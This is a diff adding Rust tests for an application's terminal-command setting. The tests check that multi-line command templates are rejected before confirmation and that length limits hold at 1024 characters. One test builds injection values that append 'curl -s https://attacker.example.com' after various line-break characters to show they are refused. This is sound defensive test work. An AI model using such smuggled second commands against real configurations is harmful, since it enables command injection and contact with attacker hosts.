@@ -149,3 +149,44 @@ fn the_terminal_command_already_saved_asks_nothing() {
         Some(COMMAND)
     );
 }
+
+#[test]
+fn a_terminal_command_on_more_lines_is_refused_before_the_confirmation() {
+    let app = TestApp::new();
+
+    for line_break in [
+        "\n", "\r", "\u{0b}", "\u{0c}", "\u{85}", "\u{2028}", "\u{2029}",
+    ] {
+        let command = format!("terminale {{cmd}}{line_break}curl -s https://attacker.example.com");
+        let error = set(&app.state, "terminal.command", &command, unasked).unwrap_err();
+
+        assert_eq!(
+            error.details,
+            Some(IpcErrorDetails::Invalid {
+                field: "terminal.command".to_owned()
+            }),
+            "{line_break:?}"
+        );
+    }
+}
+
+#[test]
+fn a_terminal_command_longer_than_1024_characters_is_refused_before_the_confirmation() {
+    let app = TestApp::new();
+    let command = format!("terminale {{cmd}} {}", "x".repeat(1024));
+
+    let error = set(&app.state, "terminal.command", &command, unasked).unwrap_err();
+
+    assert_eq!(error.code, ErrorCode::Invalid);
+}
+
+#[test]
+fn a_terminal_command_of_1024_characters_is_asked_about() {
+    let app = TestApp::new();
+    let command = format!("terminale {{cmd}} {}", "x".repeat(1024 - 16));
+    assert_eq!(command.chars().count(), 1024);
+
+    let saved = set(&app.state, "terminal.command", &command, |_| true);
+
+    assert!(saved.is_ok(), "{saved:?}");
+}
